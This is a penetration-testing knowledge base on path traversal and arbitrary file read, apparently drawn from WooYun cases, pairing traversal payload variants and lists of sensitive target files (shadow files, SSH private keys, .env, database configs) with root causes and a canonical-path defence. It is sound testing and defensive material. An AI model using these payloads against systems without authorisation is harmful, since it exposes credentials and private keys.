# File Traversal and Arbitrary File Read Knowledge Base

> Meta-knowledge distilled from real WooYun file traversal and arbitrary file read cases.
> Data source: `wooyun_vulnerabilities.json`; generated originally on 2026-01-23.

This manual preserves the original technical focus: recognize file path parameters, test traversal and encoding variants, target high-value files, and fix file access by design rather than by fragile string filtering.

## 1. Parameter Naming Patterns

| Parameter | Typical use |
|---|---|
| `filename`, `fileName`, `XFileName` | Downloaded file name, attachment name |
| `filepath`, `filePath`, `FileUrl` | Server-side path or generated file URL |
| `path`, `dir`, `folder` | Generic directory or resource path |
| `file`, `resource`, `inputFile` | Generic file read or import |
| `url` | SSRF plus file-read combination |
| `template`, `tpl`, `page`, `include` | Template include and view rendering |
| `download`, `attachment`, `doc` | Document and attachment retrieval |

Common paired parameters:

```text
?path=xxx&name=xxx
?filePath=xxx&fileName=xxx
?FileUrl=xxx&FileName=xxx
?file=xxx&showname=xxx
?inputFile=xxx&type=xxx
```

## 2. Traversal Payload Families

### Basic traversal

```text
../
../../
../../../
..\..\
..\..\..\
```

### URL encoding

```text
../  -> %2e%2e%2f
..\  -> %2e%2e%5c
/    -> %2f
\    -> %5c
.    -> %2e
```

### Double encoding

```text
../  -> %252e%252e%252f
..\  -> %252e%252e%255c
```

### Overlong UTF-8 and server-specific parsing

```text
.. -> %c0%ae%c0%ae
/  -> %c0%af
\  -> %c1%9c
```

Use this family only in authorized tests and only where the server stack may normalize overlong encoding, such as older Java containers.

### Null byte truncation

```text
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

This applies mainly to old PHP and legacy Java/native bindings that truncate strings at null bytes.

### Base64-wrapped paths

Some products encode file paths before passing them to download handlers.

```text
../../../windows/win.ini -> Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
```

## 3. High-Value Read Targets

### Linux

```text
/etc/passwd
/etc/shadow
/etc/hosts
/etc/group
/etc/sudoers
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/home/[user]/.ssh/id_rsa
/root/.bash_history
/proc/self/environ
/proc/self/cmdline
```

### Windows

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\Users\Administrator\.ssh\id_rsa
C:\inetpub\wwwroot\web.config
```

### Web applications

```text
WEB-INF/web.xml
WEB-INF/classes/application.properties
WEB-INF/classes/db.properties
WEB-INF/classes/log4j.properties
application.yml
.env
config.php
database.php
settings.py
wp-config.php
```

### Version control and backups

```text
.svn/entries
.git/config
.git/HEAD
.hg/store
backup.zip
wwwroot.rar
db.sql
```

## 4. Testing Workflow

1. Find every endpoint that returns, previews, imports, exports, or deletes a file.
2. Identify whether the file identifier is a raw path, encoded path, database ID, object key, or URL.
3. Test safe known files first, such as application configuration names or harmless OS files.
4. Try traversal, mixed slash, encoding, and path normalization variants.
5. Confirm impact by showing the file type and sensitive fields without dumping excessive data.

## 5. Root Causes

| Root cause | Example |
|---|---|
| Direct path concatenation | `baseDir + request.getParameter("file")` |
| Incomplete blacklist | Blocks `../` but not `%2e%2e%2f` |
| Canonicalization after validation | Validate raw string, then server decodes to traversal |
| Trusting file names from database | Attacker controls uploaded file name used later |
| URL-to-file conversion | SSRF or proxy endpoint supports `file://` |
| Static file misconfiguration | Backup or VCS directories exposed |

## 6. Defensive Design

- Use opaque file IDs, not user-supplied paths.
- Resolve the canonical path and verify it stays inside an approved base directory.
- Maintain allowlists for file extensions and storage buckets.
- Do not allow `file://`, local addresses, or internal protocols in URL fetchers.
- Store uploads outside the web root and serve them through an authorization-checked controller.
- Disable directory listing and block VCS or backup directories at the web server layer.

Example canonical-path guard:

```java
Path base = Paths.get("/srv/app/files").toRealPath();
Path requested = base.resolve(userInput).normalize().toRealPath();
if (!requested.startsWith(base)) {
    throw new SecurityException("path escapes base directory");
}
```

## 7. Reporting Checklist

- Vulnerable endpoint and parameter.
- Original and normalized path behavior.
- Exact payload used, preserving encodings.
- Proof that the returned file is outside the intended directory.
- Sensitive impact: credentials, source code, keys, or internal topology.
- Recommended fix: file IDs plus canonical path enforcement.
